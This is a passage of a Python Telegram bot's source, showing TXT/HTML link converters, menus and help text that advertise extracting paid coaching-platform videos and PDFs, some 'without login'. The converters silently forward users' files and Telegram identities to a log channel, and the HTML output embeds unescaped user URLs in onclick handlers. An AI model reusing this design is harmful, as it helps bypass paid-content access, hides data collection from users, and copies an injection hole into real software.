    elif q.data=="swvid_bk":
        await show_home_cb(q.message); return MAIN_MENU
    elif q.data.startswith("sswt_"): return await study_sw_topics_handler(update,context)
    elif q.data in ("back_home","noop"): return STUDY_SW_VIDEOS
    return STUDY_SW_VIDEOS

# ══════════════════════════════════════════════════════
#  TXT → HTML CONVERTER
# ══════════════════════════════════════════════════════

def _html_extract_names_urls(content):
    """Parse txt lines: '[topic] name : url' or 'name : url'"""
    data = []
    for line in content.strip().split("\n"):
        line = line.strip()
        if not line:
            continue
        if ":" in line:
            # Split on LAST occurrence of ' : ' to keep URLs intact
            idx = line.rfind(" : ")
            if idx != -1:
                name = line[:idx].strip()
                url  = line[idx+3:].strip()
            else:
                parts = line.split(":", 1)
                name = parts[0].strip()
                url  = parts[1].strip()
            if url:
                data.append((name, url))
    return data

def _html_categorize(urls):
    videos, pdfs, others = [], [], []
    for name, url in urls:
        lo = url.lower()
        if "akamaized.net/" in url or "1942403233.rsc.cdn77.org/" in url:
            new_url = f"https://www.khanglobalstudies.com/player?src={url}"
            videos.append((name, new_url))
        elif "d1d34p8vz63oiq.cloudfront.net/" in url:
            # PW cloudfront — keep as-is (no external token in bot context)
            videos.append((name, url))
        elif "youtube.com/embed" in url:
            yt_id = url.split("/")[-1]
            videos.append((name, f"https://www.youtube.com/watch?v={yt_id}"))
        elif ".m3u8" in lo or ".mp4" in lo:
            videos.append((name, url))
        elif "pdf" in lo or url.endswith(".pdf"):
            pdfs.append((name, url))
        else:
            others.append((name, url))
    return videos, pdfs, others

def _html_generate(file_stem, videos, pdfs, others):
    video_links = "".join(
        f'<a href="#" onclick="playVideo(\'{url}\')">'
        f'<span class="icon">🎬</span>{name}</a>'
        for name, url in videos
    )
    pdf_links = "".join(
        f'<a href="{url}" target="_blank">'
        f'<span class="icon">📄</span>{name}</a>'
        for name, url in pdfs
    )
    other_links = "".join(
        f'<a href="{url}" target="_blank">'
        f'<span class="icon">🌐</span>{name}</a>'
        for name, url in others
    )

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{file_stem}</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<link href="https://vjs.zencdn.net/8.10.0/video-js.css" rel="stylesheet"/>
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif;font-size:14px;}}
body{{background:#f4f6fb;color:#333;line-height:1.5;}}
header{{background:linear-gradient(135deg,#1c1c2e,#23234a);color:#fff;padding:14px 10px;text-align:center;font-size:17px;font-weight:bold;letter-spacing:.5px;}}
header p{{font-size:12px;color:#aac4ff;margin-top:4px;}}
#video-player{{margin:14px auto;width:95%;max-width:720px;}}
.search-bar{{margin:12px auto;width:95%;max-width:520px;text-align:center;}}
.search-bar input{{width:100%;padding:9px 14px;border:1.5px solid #4f8ef7;border-radius:25px;font-size:14px;outline:none;transition:border .2s;}}
.search-bar input:focus{{border-color:#1a5cdb;}}
.tabs{{display:flex;justify-content:center;gap:10px;margin:12px auto;width:95%;max-width:520px;}}
.tab{{flex:1;padding:10px;background:#fff;box-shadow:0 2px 8px rgba(0,0,0,.1);cursor:pointer;border-radius:8px;font-size:13px;text-align:center;font-weight:600;transition:all .2s;border:2px solid transparent;}}
.tab:hover,.tab.active{{background:#4f8ef7;color:#fff;border-color:#4f8ef7;}}
.content{{display:none;margin:12px auto;width:95%;max-width:720px;background:#fff;padding:16px;border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,.08);}}
.content h2{{font-size:15px;margin-bottom:10px;color:#4f8ef7;border-bottom:2px solid #e8eef8;padding-bottom:6px;}}
.video-list a,.pdf-list a,.other-list a{{display:flex;align-items:center;gap:7px;padding:8px 10px;margin:4px 0;background:#f0f4ff;border-radius:6px;text-decoration:none;color:#1a3a7a;font-size:13px;transition:all .15s;}}
.video-list a:hover,.pdf-list a:hover,.other-list a:hover{{background:#4f8ef7;color:#fff;}}
.icon{{font-size:15px;}}
footer{{margin-top:24px;font-size:12px;padding:10px;background:#1c1c2e;color:#aac4ff;text-align:center;}}
</style>
</head>
<body>
<header>
  📚 {file_stem}
  <p>|| {len(videos)} Videos &bull; {len(pdfs)} PDFs &bull; {len(others)} Others ||</p>
</header>
<div id="video-player">
  <video id="vip-player" class="video-js vjs-default-skin" controls preload="auto" width="640" height="360"></video>
</div>
<div class="search-bar">
  <input type="text" id="searchInput" placeholder="🔍 Search videos, PDFs, links..." oninput="filterContent()">
</div>
<div class="tabs">
  <div class="tab" id="tab-videos" onclick="showContent('videos')">🎬 Videos ({len(videos)})</div>
  <div class="tab" id="tab-pdfs"   onclick="showContent('pdfs')">📄 PDFs ({len(pdfs)})</div>
  <div class="tab" id="tab-others" onclick="showContent('others')">🌐 Others ({len(others)})</div>
</div>
<div id="videos" class="content">
  <h2>🎬 Video Lectures</h2>
  <div class="video-list">{video_links}</div>
</div>
<div id="pdfs" class="content">
  <h2>📄 PDF Notes</h2>
  <div class="pdf-list">{pdf_links}</div>
</div>
<div id="others" class="content">
  <h2>🌐 Other Resources</h2>
  <div class="other-list">{other_links}</div>
</div>
<footer>⚡ VIP Study Bot | TXT → HTML Converter</footer>
<script src="https://vjs.zencdn.net/8.10.0/video.min.js"></script>
<script>
const player = videojs('vip-player',{{controls:true,autoplay:false,preload:'auto',fluid:true}});
function playVideo(url){{
  if(url.includes('.m3u8')){{
    player.src({{src:url,type:'application/x-mpegURL'}});
    player.play().catch(()=>window.open(url,'_blank'));
  }}else{{window.open(url,'_blank');}}
}}
function showContent(tab){{
  document.querySelectorAll('.content').forEach(c=>c.style.display='none');
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.getElementById(tab).style.display='block';
  document.getElementById('tab-'+tab).classList.add('active');
  filterContent();
}}
function filterContent(){{
  const q=document.getElementById('searchInput').value.toLowerCase();
  ['videos','pdfs','others'].forEach(cat=>{{
    const items=document.querySelectorAll('#'+cat+' .'+cat.replace('s','')+'-list a, #'+cat+' .'+cat+'-list a');
    let any=false;
    document.querySelectorAll('#'+cat+' a').forEach(a=>{{
      const show=a.textContent.toLowerCase().includes(q);
      a.style.display=show?'flex':'none';
      if(show)any=true;
    }});
    const h=document.querySelector('#'+cat+' h2');
    if(h)h.style.display=any?'block':'none';
  }});
}}
document.addEventListener('DOMContentLoaded',()=>showContent('videos'));
</script>
</body>
</html>"""

async def txt_html_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive a .txt file and convert to HTML, then log to channel."""
    msg = update.message
    user = update.effective_user

    # Must be a document
    if not msg.document:
        await msg.reply_text(
            "❌ *Bhai, pehle .txt file bhejo!*\n\n"
            "📌 `/cancel` se wapas jao.",
            parse_mode=ParseMode.MARKDOWN)
        return TXT_HTML_WAIT

    fname = msg.document.file_name or "file.txt"
    if not fname.lower().endswith(".txt"):
        await msg.reply_text(
            "❌ *Sirf `.txt` file accept hogi!*",
            parse_mode=ParseMode.MARKDOWN)
        return TXT_HTML_WAIT

    prog = await msg.reply_text("⏳ *Converting TXT → HTML...*", parse_mode=ParseMode.MARKDOWN)

    try:
        # Download the txt file
        tg_file = await context.bot.get_file(msg.document.file_id)
        txt_bytes = await tg_file.download_as_bytearray()
        content = txt_bytes.decode("utf-8", errors="ignore")

        # Parse & convert
        pairs = _html_extract_names_urls(content)
        if not pairs:
            await safe_edit(prog, "❌ *File mein koi valid link nahi mila!*\n\nFormat: `Name : URL`")
            return TXT_HTML_WAIT

        videos, pdfs, others = _html_categorize(pairs)
        file_stem = os.path.splitext(fname)[0]
        html_content = _html_generate(file_stem, videos, pdfs, others)

        # Send HTML file
        html_bytes = html_content.encode("utf-8")
        html_buf = BytesIO(html_bytes)
        html_buf.name = file_stem + ".html"

        caption = (
            f"🌐 *HTML Ready!*\n\n"
            f"📌 `{file_stem}`\n"
            f"🎬 Videos: `{len(videos)}`\n"
            f"📄 PDFs: `{len(pdfs)}`\n"
            f"🌐 Others: `{len(others)}`\n"
            f"📦 Total: `{len(pairs)}`\n\n"
            f"_VIP Study Bot ⚡_"
        )
        await msg.reply_document(
            document=html_buf,
            filename=file_stem + ".html",
            caption=caption,
            parse_mode=ParseMode.MARKDOWN
        )
        try:
            await prog.delete()
        except:
            pass

        # ── Log to channel — TXT + HTML dono ──
        try:
            uid   = user.id
            name  = user.full_name
            uname = f"@{user.username}" if user.username else "No username"
            log_caption = (
                f"🌐 *TXT → HTML Convert*\n\n"
                f"👤 Name: [{name}](tg://user?id={uid})\n"
                f"🆔 ID: `{uid}`\n"
                f"📱 Username: {uname}\n\n"
                f"📂 *Original:* `{fname}`\n"
                f"🎬 Videos: `{len(videos)}` | 📄 PDFs: `{len(pdfs)}` | 🌐 Others: `{len(others)}`\n\n"
                f"🕐 {time.strftime('%Y-%m-%d %H:%M:%S')}"
            )
            # Send original TXT file to log channel
            txt_log_buf = BytesIO(content.encode("utf-8"))
            txt_log_buf.name = fname
            await context.bot.send_document(
                chat_id=LOG_CHANNEL_ID,
                document=txt_log_buf,
                filename=fname,
                caption=log_caption,
                parse_mode=ParseMode.MARKDOWN
            )
            # Send converted HTML file to log channel
            html_log_buf = BytesIO(html_bytes)
            html_log_buf.name = file_stem + ".html"
            await context.bot.send_document(
                chat_id=LOG_CHANNEL_ID,
                document=html_log_buf,
                filename=file_stem + ".html",
                caption=f"🌐 *HTML File* — `{file_stem}`"
            )
        except Exception as e:
            logger.error(f"Log channel (txthtml): {e}")

    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`")

    return ConversationHandler.END

# ══════════════════════════════════════════════════════
#  HTML → TXT CONVERTER
# ══════════════════════════════════════════════════════

def _html_to_txt_parse(html_content: str, file_stem: str) -> str:
    """Kisi bhi HTML se links extract karke clean TXT banata hai."""
    import re

    lines = []
    seen  = set()

    # ── BeautifulSoup se parse (best result) ──
    try:
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(html_content, "html.parser")

        # Remove noise tags
        for tag in soup(["script", "style", "head", "noscript", "svg", "footer", "meta"]):
            tag.decompose()

        for a in soup.find_all("a"):
            href    = (a.get("href") or "").strip()
            onclick = (a.get("onclick") or "")
            name    = re.sub(r'\s+', ' ', a.get_text(separator=" ", strip=True)).strip()

            # onclick="playVideo('url')" — bot generated HTML
            if onclick:
                m = re.search(r"playVideo\(['\"](.+?)['\"]\)", onclick)
                if m:
                    url = m.group(1).strip()
                    if url and url not in seen:
                        seen.add(url)
                        lines.append(f"{name or 'Video'} : {url}")
                continue

            # Normal href
            if (href and href not in seen
                    and not href.startswith(("#", "javascript", "mailto"))):
                seen.add(href)
                lines.append(f"{name or href} : {href}")

        # Agar koi link nahi mila — plain text nikalo
        if not lines:
            for elem in soup.find_all(["p", "li", "h1", "h2", "h3", "td"]):
                t = re.sub(r'\s+', ' ', elem.get_text(strip=True)).strip()
                if t and len(t) > 3:
                    lines.append(t)

    # ── Regex fallback (bs4 nahi hai) ──
    except ImportError:
        # onclick playVideo
        for m in re.finditer(r"playVideo\(['\"](.+?)['\"]\)", html_content):
            url = m.group(1).strip()
            if url and url not in seen:
                seen.add(url)
                # nearby text as name
                snip = html_content[max(0, m.start()-300):m.start()+300]
                nm = re.search(r'>([^<]{3,80})<', snip)
                name = re.sub(r'\s+', ' ', nm.group(1)).strip() if nm else "Video"
                lines.append(f"{name} : {url}")

        # <a href="...">name</a>
        for m in re.finditer(
                r'<a\s[^>]*href=["\']([^"\'#][^"\']*)["\'][^>]*>(.*?)</a>',
                html_content, re.IGNORECASE | re.DOTALL):
            url  = m.group(1).strip()
            name = re.sub(r'<[^>]+>', '', m.group(2))
            name = re.sub(r'\s+', ' ', name).strip() or url
            if url and url not in seen and not url.startswith("mailto:"):
                seen.add(url)
                lines.append(f"{name} : {url}")

    header = (
        f"{'='*52}\n"
        f"  VIP Study Bot | HTML → TXT\n"
        f"  File   : {file_stem}\n"
        f"  Links  : {len(lines)}\n"
        f"  Time   : {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"{'='*52}\n\n"
    )
    return header + "\n".join(lines)


async def html_to_txt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """HTML file receive karo → TXT mein convert karo → user + log channel pe bhejo."""
    msg  = update.message
    user = update.effective_user

    # File check
    if not msg.document:
        await msg.reply_text(
            "❌ *Pehle `.html` file bhejo!*\n\n_/cancel to go back_",
            parse_mode=ParseMode.MARKDOWN)
        return HTML_TXT_WAIT

    fname = msg.document.file_name or "file.html"
    if not fname.lower().endswith((".html", ".htm")):
        await msg.reply_text(
            "❌ *Sirf `.html` ya `.htm` file accept hogi!*",
            parse_mode=ParseMode.MARKDOWN)
        return HTML_TXT_WAIT

    prog = await msg.reply_text("⏳ *Converting HTML → TXT...*", parse_mode=ParseMode.MARKDOWN)

    try:
        # Download
        tg_file     = await context.bot.get_file(msg.document.file_id)
        raw_bytes   = await tg_file.download_as_bytearray()
        html_content = raw_bytes.decode("utf-8", errors="ignore")

        file_stem   = os.path.splitext(fname)[0]

        # Convert
        txt_content = _html_to_txt_parse(html_content, file_stem)
        link_count  = sum(1 for l in txt_content.split("\n") if " : http" in l)

        # ── Send TXT to user ──
        txt_buf      = BytesIO(txt_content.encode("utf-8"))
        txt_buf.name = file_stem + ".txt"
        await msg.reply_document(
            document  = txt_buf,
            filename  = file_stem + ".txt",
            caption   = (
                f"📄 *TXT Ready!*\n\n"
                f"📌 `{file_stem}`\n"
                f"🔗 Links: `{link_count}`\n\n"
                f"_VIP Study Bot ⚡_"
            ),
            parse_mode=ParseMode.MARKDOWN
        )
        try: await prog.delete()
        except: pass

        # ── Log channel — HTML file + TXT file dono ──
        try:
            uid   = user.id
            name  = user.full_name
            uname = f"@{user.username}" if user.username else "No username"
            log_cap = (
                f"📄 *HTML → TXT Convert*\n\n"
                f"👤 Name: [{name}](tg://user?id={uid})\n"
                f"🆔 ID: `{uid}`\n"
                f"📱 Username: {uname}\n\n"
                f"📂 *Original:* `{fname}`\n"
                f"🔗 Links found: `{link_count}`\n\n"
                f"🕐 {time.strftime('%Y-%m-%d %H:%M:%S')}"
            )
            # Original HTML
            html_log_buf      = BytesIO(raw_bytes)
            html_log_buf.name = fname
            await context.bot.send_document(
                chat_id    = LOG_CHANNEL_ID,
                document   = html_log_buf,
                filename   = fname,
                caption    = log_cap,
                parse_mode = ParseMode.MARKDOWN
            )
            # Converted TXT
            txt_log_buf      = BytesIO(txt_content.encode("utf-8"))
            txt_log_buf.name = file_stem + ".txt"
            await context.bot.send_document(
                chat_id  = LOG_CHANNEL_ID,
                document = txt_log_buf,
                filename = file_stem + ".txt",
                caption  = f"📄 *Converted TXT* — `{file_stem}`"
            )
        except Exception as e:
            logger.error(f"Log channel (htmltxt): {e}")

    except Exception as ex:
        await safe_edit(prog, f"❌ *Error:* `{str(ex)[:200]}`")

    return ConversationHandler.END

# ══════════════════════════════════════════════════════
#  SEND RESULT FILE
# ══════════════════════════════════════════════════════
async def send_result(message, prog, all_lines, bname, bid, tv, tp, fv, fp, ft, t0, platform):
    elapsed=time.time()-t0; ok=tv+tp; fail=fv+fp; sr=int((ok/max(ok+fail,1))*100)
    txt=(f"✅ *Extract Complete! [{platform}]*\n\n📌 *{bname}*\n🆔 `{bid}`\n\n"
         f"━━━━━━━━━━━━━━━━━━━━\n🎥 Videos: `{tv}`\n📄 PDFs: `{tp}`\n📦 Total: `{len(all_lines)}`\n"
         f"━━━━━━━━━━━━━━━━━━━━\n❌ Failed V: `{fv}` | P: `{fp}`\n")
    if ft: txt+=f"❌ Failed Topics: `{len(ft)}`\n"
    txt+=(f"━━━━━━━━━━━━━━━━━━━━\n✅ Success: `{sr}%` | ⏱️ `{elapsed:.1f}s`\n\n📥 *File bhej raha hoon...*")
    await safe_edit(prog,txt)
    fname=f"{platform}_{safe_fn(bname)}_{bid}.txt"
    hdr=(f"════════════════════════════\n  VIP Study — {platform}\n  Batch: {bname}\n  ID: {bid}\n"
         f"  Videos: {tv} | PDFs: {tp} | Total: {len(all_lines)}\n  Success: {sr}% | Time: {elapsed:.1f}s\n"
         f"════════════════════════════\n\n")
    fb=BytesIO((hdr+"\n".join(all_lines)).encode()); fb.name=fname
    for _ in range(3):
        try:
            await message.reply_document(document=fb, filename=fname,
                caption=(f"📂 *{bname}* [{platform}]\n🎥 `{tv}` | 📄 `{tp}` | 📦 `{len(all_lines)}`\n\n_VIP Study Bot ⚡_"),
                parse_mode=ParseMode.MARKDOWN); break
        except RetryAfter as e: await asyncio.sleep(e.retry_after+1); fb.seek(0)
        except Exception as ex:
            logger.error(f"Send: {ex}"); await message.reply_text("⚠️ File send fail. /start karo."); break
    if ft:
        await message.reply_text("⚠️ *Koi data nahi in topics:*\n"+"".join(f"• {t}\n" for t in ft), parse_mode=ParseMode.MARKDOWN)

# ══════════════════════════════════════════════════════
#  CANCEL / HELP / UNKNOWN / ERROR
# ══════════════════════════════════════════════════════
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancel. /start se wapas jao.")
    return ConversationHandler.END

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *VIP Study Bot v13.0 — Help*\n\n"
        "/start — Main menu\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ *Extract Mode:*\n\n"
        "🔐 *Login Extract* _(Free for all):_\n"
        "   🏫 ClassPlus\n   📚 Adda247\n   🎯 RG Vikramjeet\n"
        "   ✏️ Physics Wallah\n   📖 Khan GS\n   📝 Exampur\n   🎓 KD Campus\n\n"
        "🆓 *Without Login* _(Premium only):_\n"
        "   🎯 CareerWill\n   🏆 SelectionWay\n   📘 Study IQ\n   📱 FreeAppx\n   ✏️ Free PW\n\n"
        "📖 *Study Mode* _(Premium only):_\n"
        "   Batch → Topic → Lecture\n"
        "   📥 Real video download + Upload\n\n"
        "🌐 *TXT → HTML* _(Free for all):_\n"
        "   .txt file bhejo → Beautiful HTML page milega!\n"
        "   Videos, PDFs & links auto-sort honge.\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"💎 Premium: {CONTACT_USER}\n\n"
        "/cancel — Cancel karo",
        parse_mode=ParseMode.MARKDOWN)

async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❓ /start bhejo.")

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")

# ══════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════
def main():
    print("🚀 VIP Study Bot v15.0 Starting...")
    print("⚡ 7 Login | 6 Without-Login | Study Mode | Admin Panel | DB Channels | Broadcast")
    print(f"🧵 MAX_WORKERS: {MAX_WORKERS} | LOG_CHANNEL: {LOG_CHANNEL_ID}")
    print("✅ LIVE!\n")

    app = (Application.builder().token(BOT_TOKEN)
           .connect_timeout(60).read_timeout(600).write_timeout(600).build())

    conv = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CommandHandler("admin", cmd_admin),
        ],
        states={
            # ── Admin Panel ──
            ADMIN_MENU: [CallbackQueryHandler(admin_menu_handler,
                pattern="^(adm_broadcast|adm_totalusers|adm_premiumusers|adm_addprem|adm_remprem|adm_dbmenu|adm_db_run_cw|adm_db_run_kgs|adm_dbedit_|adm_back|adm_close|noop)")],
            ADMIN_BROADCAST: [MessageHandler(filters.ALL & ~filters.COMMAND, admin_broadcast_handler)],
            ADMIN_ADD_PREM:  [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_prem_handler)],
            ADMIN_REM_PREM:  [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_rem_prem_handler)],
            ADMIN_DB_MENU:   [CallbackQueryHandler(admin_menu_handler,
                pattern="^(adm_dbedit_|adm_db_run_cw|adm_db_run_kgs|adm_back|noop)")],
            ADMIN_DB_EDIT:   [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_db_edit_handler)],

            MAIN_MENU: [CallbackQueryHandler(main_menu_handler,
                pattern="^(mode_extract|mode_study|mode_txthtml|mode_htmltxt|back_home|noop)$")],

            EXTRACT_MENU: [CallbackQueryHandler(extract_menu_handler,
                pattern="^(ext_login|ext_nologin|ext_back|back_home|noop)$")],

            LOGIN_MENU: [CallbackQueryHandler(login_menu_handler,
                pattern="^(lx_cp|lx_adda|lx_rg|lx_pw|lx_khan|lx_exampur|lx_kd|ext_back|back_home)$")],

            NOLOGIN_MENU: [CallbackQueryHandler(nologin_menu_handler,
                pattern="^(nlx_cw|nlx_sw|nlx_iq|nlx_fappx|nlx_fpw|nlx_kgs|ext_back|back_home|noop)$")],

            # ── Login Extractors ──
            CP_STATE:     [MessageHandler(filters.TEXT & ~filters.COMMAND, cp_handler)],
            CP_OTP:       [MessageHandler(filters.TEXT & ~filters.COMMAND, cp_otp_handler)],
            ADDA_STATE:   [MessageHandler(filters.TEXT & ~filters.COMMAND, adda_handler)],
            RG_STATE:     [MessageHandler(filters.TEXT & ~filters.COMMAND, rg_handler)],
            RG_COURSE:    [MessageHandler(filters.TEXT & ~filters.COMMAND, rg_course_handler)],
            PW_STATE:     [MessageHandler(filters.TEXT & ~filters.COMMAND, pw_handler)],
            PW_BATCH:     [MessageHandler(filters.TEXT & ~filters.COMMAND, pw_batch_handler)],
            KHAN_STATE:   [MessageHandler(filters.TEXT & ~filters.COMMAND, khan_handler)],
            EXAMPUR_STATE:[MessageHandler(filters.TEXT & ~filters.COMMAND, exampur_handler)],
            KD_STATE:     [MessageHandler(filters.TEXT & ~filters.COMMAND, kd_handler)],

            # ── Without Login ──
            CW_BROWSE:       [CallbackQueryHandler(cw_browse_handler,
                pattern="^(cw_pg_|cw_ex_|cw_search|nlx_back|back_home|noop)")],
            CW_SEARCH_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, cw_search_handler),
                              CallbackQueryHandler(cw_browse_handler, pattern="^(cw_pg_|cw_ex_|nlx_back|noop)")],
            SW_BROWSE:       [CallbackQueryHandler(sw_browse_handler,
                pattern="^(sw_pg_|sw_bt_|nlx_back|back_home|noop)")],
            IQ_MENU:         [CallbackQueryHandler(iq_menu_handler,
                pattern="^(iq_login|iq_free|nlx_back|iq_submenu|back_home)")],
            IQ_AUTH:         [MessageHandler(filters.TEXT & ~filters.COMMAND, iq_auth_handler)],
            IQ_OTP_STATE:    [MessageHandler(filters.TEXT & ~filters.COMMAND, iq_otp_handler_state)],
            IQ_BATCH_LIST:   [CallbackQueryHandler(iq_batch_list_handler,
                pattern="^(iq_bt_|back_main|back_home)")],
            IQ_FREE_BROWSE:  [CallbackQueryHandler(iq_free_browse_handler,
                pattern="^(iqf_pg_|iqf_ex_|iqf_pv_|iqf_search|iq_submenu|back_home|nlx_back|noop)")],
            IQ_FREE_SEARCH:  [MessageHandler(filters.TEXT & ~filters.COMMAND, iq_free_search_handler),
                              CallbackQueryHandler(iq_free_browse_handler,
                                  pattern="^(iqf_pg_|iqf_ex_|iqf_pv_|iq_submenu|back_home|noop)")],
            FAPPX_STATE:     [MessageHandler(filters.TEXT & ~filters.COMMAND, fappx_handler)],
            FPW_STATE:       [MessageHandler(filters.TEXT & ~filters.COMMAND, fpw_handler)],
            KGS_BROWSE:      [CallbackQueryHandler(kgs_browse_handler,
                pattern="^(kgs_pg_|kgs_ex_|nlx_back|back_home|noop)")],
            TXT_HTML_WAIT:   [MessageHandler(filters.Document.ALL, txt_html_handler),
                              MessageHandler(filters.TEXT & ~filters.COMMAND, txt_html_handler)],
            HTML_TXT_WAIT:   [MessageHandler(filters.Document.ALL, html_to_txt_handler),
                              MessageHandler(filters.TEXT & ~filters.COMMAND, html_to_txt_handler)],

            # ── Study Mode ──
            STUDY_MENU: [CallbackQueryHandler(study_menu_handler,
                pattern="^(study_cw|study_sw|study_kgs|back_home|back_study|study_cw_pg_|study_cw_bt_|study_sw_pg_|study_sw_bt_|noop)")],
            STUDY_CW_BATCHES: [CallbackQueryHandler(study_menu_handler,
                pattern="^(study_cw_pg_|study_cw_bt_|back_home|noop)")],
            STUDY_CW_TOPICS:  [CallbackQueryHandler(study_cw_topics_handler,
                pattern="^(scw_t_|scwbk_|study_cw_pg_|back_home|noop)")],
            STUDY_CW_VIDEOS:  [CallbackQueryHandler(study_cw_videos_handler,
                pattern="^(scwv_|scwbk_|back_home|noop)")],
            STUDY_VIDEO_ACT:  [CallbackQueryHandler(study_video_act_handler,
                pattern="^(vid_dl|vid_link|vid_back)")],
            STUDY_SW_BATCHES: [CallbackQueryHandler(study_menu_handler,
                pattern="^(study_sw_bt_|study_sw_pg_|back_home|noop)")],
            STUDY_SW_TOPICS:  [CallbackQueryHandler(study_sw_topics_handler,
                pattern="^(sswt_|sswbk_|study_sw_pg_|back_home|noop)")],
            STUDY_SW_VIDEOS:  [CallbackQueryHandler(study_sw_videos_handler,
                pattern="^(sswv_|swvid_dl|swvid_lk|swvid_bk|sswt_|sswbk_|study_sw_pg_|back_home|noop)")],
            STUDY_KGS_COURSES:  [CallbackQueryHandler(study_kgs_courses_handler,
                pattern="^(study_kgs|skgs_c_|skgs_cpg_|back_home|noop)")],
            STUDY_KGS_SUBJECTS: [CallbackQueryHandler(study_kgs_subjects_handler,
                pattern="^(skgs_s_|skgs_c_|back_home|noop)")],
            STUDY_KGS_LESSONS:  [CallbackQueryHandler(study_kgs_lessons_handler,
                pattern="^(skgs_l_|skgs_vid_dl|skgs_vid_lk|skgs_pdf_lk|skgs_s_|back_home|noop)")],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_message=False, allow_reentry=True,
    )

    app.add_handler(conv)
    app.add_handler(CommandHandler("help",       help_cmd))
    app.add_handler(CommandHandler("adduser",    cmd_adduser))
    app.add_handler(CommandHandler("removeuser", cmd_removeuser))
    app.add_handler(CommandHandler("listusers",  cmd_listusers))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown))
    app.add_error_handler(error_handler)

    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    while True:
        try: main()
        except KeyboardInterrupt: print("\n👋 Bot stopped."); break
        except Exception as e: print(f"⚠️ Crashed: {e} — 5s me restart..."); time.sleep(5)
